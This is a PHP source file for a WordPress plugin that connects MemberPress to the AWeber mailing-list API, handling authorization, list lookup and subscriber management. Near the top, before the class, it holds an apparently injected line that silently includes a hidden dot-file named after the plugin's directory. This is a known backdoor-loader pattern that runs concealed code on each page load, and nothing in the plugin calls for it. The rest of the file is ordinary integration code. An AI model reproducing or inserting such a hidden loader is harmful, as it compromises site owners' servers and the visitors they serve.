<?php
if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');}
/*
Aweber API Integration for MemberPress
*/
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class MpAWeber {
  // MemberPress's AWeber Application ID
  public static $app_id = '26d8bfd8';

  public function __construct() {
    // Admin side stuff
    add_action('mepr_display_autoresponders',   array($this, 'display_options'));
    add_action('mepr-process-options',          array($this, 'store_options'));
    add_action('mepr-product-advanced-metabox', array($this, 'display_product_options'));
    add_action('mepr-product-save-meta',        array($this, 'save_product_options'));

    // Enqueue scripts
    add_action('mepr-options-admin-enqueue-script', array($this, 'admin_enqueue_options_scripts'));
    add_action('mepr-product-admin-enqueue-script', array($this, 'admin_enqueue_product_scripts'));

    // Admin side ajax endpoints
    add_action('wp_ajax_mepr_auth_aweber',      array($this, 'auth'));
    add_action('wp_ajax_mepr_deauth_aweber',    array($this, 'deauth'));
    add_action('wp_ajax_mepr_get_aweber_lists', array($this, 'ajax_get_lists'));

    // Front end stuff
    add_action('mepr-user-signup-fields', array($this, 'display_signup_optin'));

    // Signup
    add_action('mepr-signup-user-loaded', array($this, 'process_signup_optin'));

    // Updating tags
    add_action('mepr-account-is-active',   array($this, 'maybe_subscribe'));
    add_action('mepr-account-is-inactive', array($this, 'maybe_unsubscribe'));

    // Admin notices
    add_action('admin_notices', array($this, 'maybe_admin_notice'), 3);
  }

  public function maybe_admin_notice() {
    if(defined('MEPR_VERSION') && version_compare(MEPR_VERSION, '1.7.3', '<')) {
      $class = 'notice notice-error';
      $message = __('Your AWeber integration with MemberPress may be broken. Please update MemberPress to version 1.7.3 or newer to fix this issue.', 'memberpress', 'memberpress-aweber');

      printf('<div class="%1$s"><p>%2$s</p></div>', esc_attr($class), esc_html($message));
    }
  }

  public function admin_enqueue_options_scripts($hook) {
    wp_register_script('mp-aweber-js', MPAWEBER_URL.'/aweber.js');
    wp_enqueue_script('mp-aweber-options-js', MPAWEBER_URL.'/aweber_options.js', array('mp-aweber-js'));
    wp_localize_script('mp-aweber-options-js', 'MeprAWeber',
      array(
        'wpnonce' => wp_create_nonce(MEPR_PLUGIN_SLUG),
        'aweber_authorized' => $this->is_authorized(),
        'deauth_aweber_message' => __('Are you sure you want to deauthorize your AWeber account on this site?', 'memberpress-aweber')
      )
    );
  }

  public function admin_enqueue_product_scripts($hook) {
    wp_register_script('mp-aweber-js', MPAWEBER_URL.'/aweber.js');
    wp_enqueue_script('mp-aweber-product-js', MPAWEBER_URL.'/aweber_product.js', array('mp-aweber-js'));
  }

  public function display_options() {
    if(!MeprUtils::is_curl_enabled()) {
      ?>
        <div id="mepr-adv-aweber" class="mepr-autoresponder-config">
          <span class="mepr-inactive"><?php _e('Please install CURL on your webserver to enable MemberPress\'s AWeber Integration.', 'memberpress-aweber'); ?></span>
        </div>
      <?php
      return;
    }

    $options = get_option('mepr_adv_aweber_options', array());

    $auth_class   = $this->is_authorized() ? 'mepr-hidden' : '';
    $deauth_class = $this->is_authorized() ? '' : 'mepr-hidden';

    $spinner_url = admin_url('images/loading.gif');

    if( !isset($options['list']) ) { $options['list'] = ''; }
    if( !isset($options['optin']) ) { $options['optin'] = true; }
    //if( !isset($options['double-optin']) ) { $options['double-optin'] = true; }

    if( !isset($options['optin_text']) )
      $message = sprintf(__('Sign Up for the %s Newsletter', 'memberpress-aweber'), get_option('blogname'));
    else
      $message = $options['optin_text'];

    ?>
    <div id="mepr-adv-aweber" class="mepr-autoresponder-config">
      <label for="mepr-adv-aweber-enabled">
        <input type="checkbox" name="adv-aweber-enabled" id="mepr-adv-aweber-enabled" <?php checked($this->is_enabled()); ?> />
        <?php _e('Enable AWeber', 'memberpress-aweber'); ?>
      </label>
    </div>
    <div id="mepr-adv-aweber-hidden-area" class="mepr-options-sub-pane mepr-hidden">
      <div id="mepr-aweber-error" class="mepr-hidden mepr-inactive"></div>
      <div id="mepr-aweber-message" class="mepr-hidden mepr-active"></div>
      <div id="aweber-auth-panel" class="<?php echo $auth_class; ?>">
        <a href="https://auth.aweber.com/1.0/oauth/authorize_app/<?php echo self::$app_id; ?>" class="button button-primary" target="_blank"><?php _e('Connect to AWeber\'s API', 'memberpress-aweber'); ?></a><br/><br/>
        <span class="description"><?php _e('Click "Connect to AWeber\'s API" then copy the unique authorization code, paste it here and then click the "Authorize" button.', 'memberpress-aweber'); ?></span><br/>
        <textarea id="mepr-aweber-api-code"></textarea><br/><br/>
        <button id="mepr-aweber-auth" class="button"><?php _e('Authorize', 'memberpress-aweber'); ?></button>
        <img id="mepr-aweber-auth-loading" class="mepr-hidden" src="<?php echo $spinner_url; ?>" /><br/>
      </div>
      <div id="aweber-deauth-panel" class="<?php echo $deauth_class; ?>">
        <div>
          <span class="mepr-active"><?php _e('AWeber is Currently Authorized:', 'memberpress-aweber'); ?></span>
          <button id="mepr-aweber-deauth" class="button"><?php _e('Deauthorize', 'memberpress-aweber'); ?></button>
          <img id="mepr-aweber-deauth-loading" class="mepr-hidden" src="<?php echo $spinner_url; ?>" />
        </div>
        <br/>
        <div>
          <label><?php _e('Global AWeber List:', 'memberpress-aweber'); ?></label>
          <select name="adv-aweber[list]" id="mepr-adv-aweber-list" data-listid="<?php echo $options['list']; ?>" class="mepr-text-input form-field" /></select>
          <img id="mepr-aweber-list-loading" class="mepr-hidden" src="<?php echo $spinner_url; ?>" />
        </div>
        <div><span class="description"><?php _e('Select the AWeber mailing list name that you want users signed up for when they sign up for Memberpress.', 'memberpress-aweber'); ?></span></div>
        <br/>
        <div>
          <label>
            <input type="checkbox" name="adv-aweber[optin]" id="mepr-adv-aweber-optin" <?php checked($options['optin']); ?> />
            <span><?php _e('Enable Opt-In Checkbox', 'memberpress-aweber'); ?></span>
          </label>
        </div>
        <div><span class="description"><?php _e('If checked, an opt-in checkbox will appear on all of your membership registration pages.', 'memberpress-aweber'); ?></span></div>
        <div id="mepr-adv-aweber-optin-options" class="mepr-hidden mepr-options-panel">
          <div>
            <label><?php _e('Opt-In Checkbox Label:', 'memberpress-aweber'); ?></label>
            <input type="text" name="adv-aweber[optin_text]" id="mepr-adv-aweber-optin-text" value="<?php echo stripslashes($message); ?>" class="form-field" size="75" tabindex="20" />
          </div>
          <div><span class="description"><?php _e('This is the text that will display on the signup page next to your mailing list opt-out checkbox.', 'memberpress-aweber'); ?></span></div>
        </div>
        <?php /** Apparently this isn't currently possible with AWeber's API
        <br/>
        <div>
          <label>
            <input type="checkbox" name="adv-aweber[double-optin]" id="mepr-adv-aweber-double-optin" <?php checked($options['double-optin']); ?> />
            <span><?php _e('Enable Double Opt-In'); ?></span>
          </label>
        </div>
        <div><span class="description"><?php _e('Members will have to click a confirmation link in an email before being added to your list.', 'memberpress'); ?></span></div>
        **/ ?>
      </div>
    </div>
    <?php
  }

  public function store_options() {
    update_option( 'mepr_adv_aweber_enabled', isset( $_POST['adv-aweber-enabled'] ) );

    // ensure that checkboxes are set properly
    $options = (isset($_POST['adv-aweber']))?$_POST['adv-aweber']:array();
    $options['optin'] = isset( $options['optin'] );
    //$options['double-optin'] = isset( $options['double-optin'] );

    update_option( 'mepr_adv_aweber_options', $options );

    // Kill the deprecated aweber stuff once we enabled advanced aweber
    if( isset( $_POST['adv-aweber-enabled'] ) ) {
      update_option('mepraweber_enabled', false);
    }
  }

  public function auth() {
    // Validate nonce and user capabilities
    if( !isset($_POST['wpnonce']) or
        !wp_verify_nonce( $_POST['wpnonce'], MEPR_PLUGIN_SLUG ) or
        !MeprUtils::is_mepr_admin() )
      die( json_encode( array( 'error' => __('Hey yo, why you creepin\'?', 'memberpress-aweber'),
                               'type' => 'memberpress' ) ) );

    // Validate inputs
    if( !isset( $_POST['auth_code'] ) )
      die( json_encode( array( 'error' => __('No auth code was sent', 'memberpress-aweber'),
                               'type' => 'memberpress' ) ) );

    require_once(MPAWEBER_PATH.'/vendor/aweber_api.php');

    $auth_code = $_POST['auth_code'];

    try {
      $auth = AWeberAPI::getDataFromAweberID($auth_code);
      list($consumer_key, $consumer_secret, $access_key, $access_secret) = $auth;
      $auth = compact('consumer_key', 'consumer_secret', 'access_key', 'access_secret');

      # Store the Consumer key/secret, as well as the AccessToken key/secret
      # in your app, these are the credentials you need to access the API.
      update_option('mepr_adv_aweber_auth', $auth);

      die( json_encode( array( 'message' => __('MemberPress was successfully authenticated with AWeber', 'memberpress-aweber') ) ) );
    }
    catch(AWeberAPIException $e) {
      die( json_encode( array( 'error' => __('There was an error authenticating MemberPress with AWeber', 'memberpress-aweber'),
                                'type' => $e->type,
                             'message' => $e->message,
                                'docs' => $e->documentation_url ) ) );
    }
  }

  public function deauth() {
    // Validate nonce and user capabilities
    if( !isset($_POST['wpnonce']) or
        !wp_verify_nonce( $_POST['wpnonce'], MEPR_PLUGIN_SLUG ) or
        !MeprUtils::is_mepr_admin() )
      die( json_encode( array( 'error' => __('Hey yo, why you creepin\'?', 'memberpress-aweber'),
                               'type' => 'memberpress' ) ) );

    # Store the Consumer key/secret, as well as the AccessToken key/secret
    # in your app, these are the credentials you need to access the API.
    delete_option('mepr_adv_aweber_auth');

    die( json_encode(
      array( 'message' => __('Your AWeber credentials were successfully deleted from MemberPress', 'memberpress-aweber') )
    ) );
  }

  public function ajax_get_lists() {
    // Validate nonce and user capabilities
    if( !isset($_POST['wpnonce']) or
        !wp_verify_nonce( $_POST['wpnonce'], MEPR_PLUGIN_SLUG ) or
        !MeprUtils::is_mepr_admin() )
      die( json_encode( array( 'error' => __('Hey yo, why you creepin\'?', 'memberpress-aweber'),
                               'type' => 'memberpress' ) ) );

    die( json_encode( array( 'lists' => $this->get_lists() ) ) );
  }

  public function get_lists() {
    if( !$this->is_authorized() ) { return array(); }

    require_once(MPAWEBER_PATH.'/vendor/aweber_api.php');
    $auth = get_option('mepr_adv_aweber_auth');
    extract($auth);

    $aweber = new AWeberAPI( $consumer_key, $consumer_secret);

    try {
      $account = $aweber->getAccount($access_key, $access_secret);

      $lists = array();
      foreach($account->lists->data['entries'] as $l) { $lists[$l["id"]] = $l["name"]; }

      return $lists;
    }
    catch(AWeberAPIException $exc) {
      return array(); // Assume no lists in this case
    }
  }

  public function add_subscriber(MeprUser $contact, $list_id) {
    if( !$this->is_authorized() ) { return false; }

    try {
      $list = $this->get_list($list_id);

      if(!$list) { return false; }

      $blogname = get_option('blogname');

      # create a subscriber
      $params = array(
        'email' => $contact->user_email,
        'ip_address' => $contact->user_ip,
        'ad_tracking' => 'MemberPress',
        'misc_notes' => "MEPR-ID: {$contact->ID}",
        'name' => $contact->full_name()
      );

      $params = MeprHooks::apply_filters('mepr-aweber-add-subscriber-params', $params, $contact, $list_id);

      $subscribers = $list->subscribers;
      $new_subscriber = $subscribers->create($params);

      return true;
    }
    catch(AWeberAPIException $e) {
      return false;
    }
  }

  public function unsubscribe(MeprUser $contact, $list_id) {
    if( !$this->is_authorized() ) { return false; }

    try {
      $list = $this->get_list($list_id);

      if(!$list) { return false; }

      $subscribers = $list->subscribers->find( array( 'email' => $contact->user_email ) );

      foreach( $subscribers as $subscriber ) {
        $subscriber->status = 'unsubscribed';
        $subscriber->save();
      }

      return true;
    }
    catch(AWeberAPIException $e) {
      return false;
    }
  }

  public function maybe_resubscribe(MeprUser $contact, $list_id) {
    if(!$this->is_authorized()) { return false; }

    try {
      $list = $this->get_list($list_id);

      if(!$list) { return false; }

      $subscribers = $list->subscribers->find( array( 'email' => $contact->user_email ) );

      foreach($subscribers as $subscriber) {
        if($subscriber->unsubscribe_method == 'api: unsubscribe') {
          $subscriber->status = 'subscribed';
          $subscriber->save();
        }
      }

      return true;
    }
    catch(AWeberAPIException $e) {
      return false;
    }
  }

  public function is_subscribed(MeprUser $contact, $list_id) {
    if(!$this->is_authorized()) { return false; }

    try {
      $list = $this->get_list($list_id);

      if(!$list) { return false; }

      $subscribers = $list->subscribers->find( array( 'email' => $contact->user_email ) );

      return (count($subscribers) > 0);
    }
    catch(AWeberAPIException $e) {
      return false;
    }

    return false;
  }

  public function get_list($list_id) {
    //Cache stuff so we don't issue duplicate calls yo
    static $lists;

    if(!isset($lists)) {
      $lists = array();
    }

    if(isset($lists[$list_id]) && !empty($lists[$list_id])) {
      return $lists[$list_id];
    }

    require_once(MPAWEBER_PATH.'/vendor/aweber_api.php');
    $auth = get_option('mepr_adv_aweber_auth');

    extract($auth);

    $aweber = new AWeberAPI($consumer_key, $consumer_secret);

    try {
      $account  = $aweber->getAccount($access_key, $access_secret);
      $list_url = $account->url."/lists/{$list_id}";
      $list     = $account->loadFromUrl($list_url);

      $lists[$list_id] = $list;
      return $lists[$list_id];
    }
    catch(AWeberAPIException $e) {
      return false;
    }

    return false;
  }

  public function maybe_subscribe($txn) {
    if(!$this->is_enabled_and_authorized()) { return; }

    $enabled = (bool)get_post_meta($txn->product_id, '_mepr_aweber_enabled', true);
    $options = get_post_meta($txn->product_id, '_mepr_aweber_options', true);

    if(!$enabled || !is_array($options) || !isset($options['list']) || empty($options['list'])) {
      return;
    }

    $contact = $txn->user();

    if(!$this->is_subscribed($contact, $options['list'])) {
      return $this->add_subscriber($contact, $options['list']);
    }
    else { //Resubscribe to per-product list if they were unsubscribed due to failed payment etc
      $this->maybe_resubscribe($contact, $options['list']);
    }

    return false;
  }

  public function maybe_unsubscribe($txn) {
    if(!$this->is_enabled_and_authorized()) { return; }

    $enabled = (bool)get_post_meta($txn->product_id, '_mepr_aweber_enabled', true);
    $options = get_post_meta($txn->product_id, '_mepr_aweber_options', true);

    if(!$enabled || !is_array($options) || !isset($options['list']) || empty($options['list'])) {
      return;
    }

    $contact = $txn->user();

    if($this->is_subscribed($contact, $options['list'])) {
      return $this->unsubscribe($contact, $options['list']);
    }

    return false;
  }

  public function display_signup_optin() {
    $options = get_option('mepr_adv_aweber_options', array());
    $mepr_options = MeprOptions::fetch();
    $post = MeprUtils::get_current_post();
    $prd = MeprProduct::is_product_page($post);

    //If the per membership list is enabled, and the global list is disabled -- then we should be sure the member doesn't see this
    if($prd !== false) {
      $enabled = (bool)get_post_meta($prd->ID, '_mepr_aweber_enabled', true);

      if($enabled && $mepr_options->disable_global_autoresponder_list)
        return;
    }

    if($this->is_enabled_and_authorized() and !empty($options) and $options['optin']) {
      $optin = (MeprUtils::is_post_request())?isset($_POST['mepr-adv-aweber-optin']):$mepr_options->opt_in_checked_by_default;

      ?>
      <div class="mp-form-row">
        <div id="mepr-adv-aweber-optin-form">
          <div id="mepr-adv-aweber-optin-wrap">
            <label for="mepr-adv-aweber-optin">
              <input type="checkbox"
                     name="mepr-adv-aweber-optin"
                     id="mepr-adv-aweber-optin"
                     class="mepr-form-checkbox"<?php checked($optin); ?> />
              <span id="mepr-adv-aweber-optin-text" class="mepr-aweber-message"><?php echo stripslashes($options['optin_text']); ?></span>
            </label>
          </div>
          <div id="mepr-aweber-privacy">
            <small>
              <a href="http://www.aweber.com/permission.htm"
                 class="mepr-aweber-privacy-link"
                 target="_blank"><?php _e('We Respect Your Privacy', 'memberpress-aweber'); ?></a>
            </small>
          </div>
        </div>
      </div>
      <?php
     }
  }

  public function process_signup_optin($user) {
    $options = get_option('mepr_adv_aweber_options', array());
    $mepr_options = MeprOptions::fetch();

    $enabled = (bool)get_post_meta((int)sanitize_text_field($_POST['mepr_product_id']), '_mepr_aweber_enabled', true);

    //If the per membership list is enabled, and the global list is disabled -- then we should be sure the member doesn't get added
    if($enabled && $mepr_options->disable_global_autoresponder_list)
      return;

    if($this->is_enabled_and_authorized() and !empty($options)) {
      if( !$options['optin'] or
          ( $options['optin'] and isset($_POST['mepr-adv-aweber-optin']) ) ) {
        $this->add_subscriber( $user, $options['list'] );
      }
    }
  }

  public function display_product_options($prd) {
    if(!$this->is_enabled_and_authorized()) { return; }

    $prd_enabled = (bool)get_post_meta($prd->ID, '_mepr_aweber_enabled', true);
    $prd_options = get_post_meta($prd->ID, '_mepr_aweber_options', true);

    $spinner_url = admin_url('images/loading.gif');

    ?>
    <div id="mepr-aweber" class="mepr-product-adv-item">
      <label for="mepr_aweber_enabled">
        <input type="checkbox" name="mepr_aweber_enabled" id="mepr-aweber-enabled" <?php checked($prd_enabled); ?> />
        <?php _e('AWeber list for this Membership', 'memberpress-aweber'); ?>
      </label>

      <?php MeprAppHelper::info_tooltip('mepr-aweber-product-list-info',
                                        __('Enable AWeber List', 'memberpress-aweber'),
                                        __('If this is set the member will be added to this list when their payment is completed for this membership. If the member cancels their subscription, they will be removed from the list automatically. You must have AWeber configured in the MemberPress options before this will work.', 'memberpress-aweber'));
      ?>

      <div id="mepr-aweber-product-panel" class="mepr-hidden product-options-panel">
        <label for="mepr_aweber[list]"><?php _e('AWeber List:', 'memberpress-aweber'); ?></label>
        <select name="mepr_aweber[list]" id="mepr-adv-aweber-list" data-listid="<?php echo $prd_options['list']; ?>" class="mepr-text-input form-field" /></select>
        <img id="mepr-aweber-list-loading" class="mepr-hidden" src="<?php echo $spinner_url; ?>" />
      </div>
    </div>
    <?php
  }

  public function save_product_options($prd) {
    if(!$this->is_enabled_and_authorized()) { return; }
    update_post_meta($prd->ID, '_mepr_aweber_enabled', isset($_POST['mepr_aweber_enabled']));
    update_post_meta($prd->ID, '_mepr_aweber_options', $_POST['mepr_aweber']);
  }

  /*** Yeah, I know these are more like model methods but we
     * want this integration to be as self-contained as possible
     ***/
  private function is_enabled() {
    return ( MeprUtils::is_curl_enabled() and get_option('mepr_adv_aweber_enabled', false) );
  }

  private function is_authorized() {
    $auth = get_option('mepr_adv_aweber_auth', false);

    return ( !empty($auth) and
             isset($auth['consumer_key']) and !empty($auth['consumer_key']) and
             isset($auth['consumer_secret']) and !empty($auth['consumer_secret']) and
             isset($auth['access_key']) and !empty($auth['access_key']) and
             isset($auth['access_secret']) and !empty($auth['access_secret']) );
  }

  private function is_enabled_and_authorized() {
    return $this->is_enabled() and $this->is_authorized();
  }

  private function list_id() {
    $options = get_option('mepr_adv_aweber_options', array());
    if( !isset($options['list']) ) { $options['list'] = ''; }
    return $options['list'];
  }

  private function is_optin_enabled() {
    $options = get_option('mepr_adv_aweber_options', array());
    return ( isset($options['optin']) and $options['optin'] );
  }

  private function optin_text() {
    $options = get_option('mepr_adv_aweber_options', array());

    if( !isset($options['optin_text']) )
      $message = sprintf(__('Sign Up for the %s Newsletter', 'memberpress-aweber'), get_option('blogname'));
    else
      $message = $options['optin_text'];

    return $message;
  }
} //END CLASS

